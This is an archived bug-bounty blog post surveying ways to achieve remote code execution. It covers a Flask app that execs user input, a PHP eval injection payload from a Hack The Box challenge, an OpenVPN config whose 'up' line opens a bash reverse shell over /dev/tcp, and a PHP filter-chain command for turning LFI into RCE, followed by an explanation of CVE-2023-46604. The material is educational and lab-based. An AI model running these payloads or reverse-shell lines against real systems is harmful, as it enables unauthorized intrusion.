# Best Approach to RCE

- **Source URL:** https://medium.com/@anekantsinghai/best-approach-to-rce-630187d4ad03?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20240222065926/https://medium.com/@anekantsinghai/best-approach-to-rce-630187d4ad03
- **Fetched:** 2026-11-19
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/5153 (id 5153)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Best Approach to RCE

--

RCE , Remote code execution is the worst nightmare , a developer could have in the field of cybersecurity. Before me explaining you the some of the most creative ways people got RCE , Lets see what RCE is:

**What is RCE**

Remote Code Execution (RCE) is a critical cybersecurity vulnerability that allows an attacker to execute arbitrary code on a target system or application remotely. This exploit occurs when an attacker gains unauthorized access to a system or network and can execute commands or code on a target machine. RCE can lead to severe consequences, such as data breaches, unauthorized access, and the compromise of sensitive information. There are various types of RCE attacks, including command injection, code injection, and deserialization vulnerabilities. Command injection involves manipulating commands in an input field to execute unintended commands on the system. Code injection exploits weaknesses in the application code, allowing the injection and execution of malicious code. Deserialization vulnerabilities target the process of converting serialized data into its original form, enabling attackers to execute arbitrary code during this process. Protecting against RCE requires secure coding practices, input validation, and regular security assessments to identify and mitigate potential vulnerabilities

# Implementation Flaws:

I’m writing this because this is one of the main reasons why the RCE get’s it’s bad name: TRUSTING USER INPUT. I was told to test a simple flask website whose code was:

```
from flask import Flask, Response, request, render_template, request
from random import choice, randint
from string import lowercase
from functools import wraps
app = Flask(__name__)
def calc(recipe):
 global garage
 garage = {}
 try: exec(recipe, garage)
 except: pass
def GCR(func): # Great Calculator of the observable universe and it's infinite timelines
 @wraps(func)
 def federation(*args, **kwargs):
  ingredient = ''.join(choice(lowercase) for _ in range(10))
  recipe = '%s = %s' % (ingredient, ''.join(map(str, [randint(1, 69), choice(['+', '-', '*']), randint(1,69)])))
  if request.method == 'POST':
   ingredient = request.form.get('ingredient', '')
   recipe = '%s = %s' % (ingredient, request.form.get('measurements', ''))
  calc(recipe)
  if garage.get(ingredient, ''):
   return render_template('index.html', calculations=garage[ingredient])
  return func(*args, **kwargs)
 return federation
@app.route('/', methods=['GET', 'POST'])
@GCR
def index():
 return render_template('index.html')
@app.route('/debug')
def debug():
 return Response(open(__file__).read(), mimetype='text/plain')
if __name__ == '__main__':
 app.run('0.0.0.0', port=1337)
```
found something? If not here’s a hint: *user input + exec function = Disaster*

The POST request is accepting two parameters : ingredient and measurements. You really don’t need the whole code to know what it’s doing . It’s taking them and executing it via exec function :

`exec(recipe, garage)`
and this recipe is made from the “ingredients” so when I pass the code:

there’s the code executed.

try again?

## Implementation #2

we’ll be looking at a htb challenge called *Lovetok.* The challenge had the code:

We can see that the back-end gives time when we give a certian value to the format parameter:

We also have the code:

we can see that the input we give ‘r’ is directly going into the eval function:

So we need to inject code here somehow -> but how?

`${system($_GET[cmd])}&cmd=ls`
We can find many different scenarios like this

## SSTI

We also get the notorious : SSTI

I wrote this code to tell you basic of it :

Look how the developer {me} trusted the user input to be name only and didn’t sanitized, look at the result:

# OS-Command Injection

This bad-boy can get into anywhere , user-agents , parameters , etc..

Simple case of checking the products may become a *doom for dev* {nice ring to it na? 😆}.

Look at the parameter we can see when we try os-command-injection.

But the real question is brother how do you know ? Well I didn’t , *I always imagine and make scenarios how the functionality would have been implemented.*

try again?:

Look at the functionality where we can make openvpn config file and run it in bg of the server

So how that might have been implemented? when we edit the openvpn config file by a bit of googling: we can change the openvpn file from here, so [this](/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da) article helped me a lot:

```
remote 192.168.122.1
ifconfig 10.200.0.2 10.200.0.1
dev tun
script-security 2
up "/bin/bash -c '/bin/bash -i > /dev/tcp/192.168.122.1/4432 0<&1 2>&1&'"
```
and we get the shell:

# LFI to RCE with php Wrappers, How?

[Tib3rius](https://youtu.be/PVdOSpF4Tl0?si=Q6dJ8SuoQtjhh5PT) couldn’t explain it any better.

Here we’ll using *pwnlab* from *vulnhub* to demonstrate on how if LFI we get then we can not only smuggle the data from the files but the execution of the code also can take place.

We directly jump to the part where we have LFI but need to exploit. So what we need first is the exploit genarator from [synacktiv](https://github.com/synacktiv/php_filter_chain_generator). We look at the parameter:

and we start genarating the payload like:

`python3 php_filter_chain_genarator.py --chain '<?php system(GET["c"])?>'`
we copy the payload and paste it into the url like this:

`http://<url>/?p=<payload>&c=id`
we get the execution:

# Deserialization

# CVE-2023–46604

Noticed by [Kunlun Labs](https://twitter.com/kunlunlab?lang=en) This vulnerability empowers a remote attacker, with network access to a broker, to execute arbitrary shell commands. The attack involves manipulating serialized class types in the **OpenWire protocol**, prompting the broker to instantiate any available class on the classpath. `OR` This vulnerability may allow a remote attacker with network access to either a Java-based OpenWire broker or client to run arbitrary shell commands by manipulating serialized class types in the OpenWire protocol to cause either the client or the broker (respectively) to instantiate any class on the classpath and the default port for openwire is `61616.`

## Vulnerability explained

Too much of a mouthful eh? Here’s a simplified version:

The exploit leverages the server’s handling of exceptions, serialization mechanisms, and classpath behaviors to execute unauthorized code and gain control over the target system. By crafting specific `ExceptionResponse` objects and manipulating the server's behavior through custom classes and XML payloads, an attacker can achieve Remote Code Execution.

The reseracher was able to access a classpath `ClassPathXmlApplicationContext`, which lead to wrong deserialization of the XML code and getting executed. The whole research can be found [here](https://anekant-singhais-organization.gitbook.io/why-so-script-kiddie/cve-explained-cve-2023-46604)

If you like what I write: I am actively looking for a job , hope you may help

My researches: [Here](https://anekant-singhais-organization.gitbook.io/why-so-script-kiddie/)

Twitter: [Here](https://twitter.com/babe_eliza24)

Linkedin: [Here](https://www.linkedin.com/in/anekant-singhai/)
